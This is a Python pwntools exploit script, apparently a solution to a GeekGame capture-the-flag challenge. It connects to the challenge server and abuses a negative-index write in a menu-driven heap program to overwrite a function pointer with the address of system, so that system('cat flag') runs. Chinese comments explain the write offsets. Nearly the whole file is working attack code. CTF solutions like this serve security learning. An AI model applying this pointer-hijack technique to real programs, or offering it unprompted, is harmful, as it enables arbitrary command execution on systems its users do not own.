from pwn import *

TOKEN = b'<token_is_deleted>'


def main():
    c = remote("prob13.geekgame.pku.edu.cn", 10013)
    c.sendline(TOKEN)
    c.recv(8192)
    c.recv(8192)

    def send(b):
        c.sendline(b)
        print("Send: ", b)
        x = c.recv(8192)
        print(x)
        time.sleep(0.1)

    send(b'1')
    send(b'0')
    send(b'16')
    # send(b'ls -l')  # 第一次用
    send(b'cat flag')  # 第二次用

    send(b'1')
    send(b'1')
    send(b'16')
    send(b'2234567890123456')

    send(b'3')
    send(b'1')
    send(b'-104')  # index 可以是负的，这样就可以写到前面去了
    # -32 写到了 node 1 的 size 上，-40 写到了 node 1 的 data_ptr 上
    # -80 写到 node 0 的 data 上
    # send(p64(0x040128A))  # fake backdoor 只是为了调试，试出地址
    send(p64(0x04010E0))  # system

    send(b'3')
    send(b'0')

    # c.interactive()

    # x = c.recv(8192 * 4).decode()
    # print(x)

    c.clean()
    c.close()


if __name__ == "__main__":
    main()
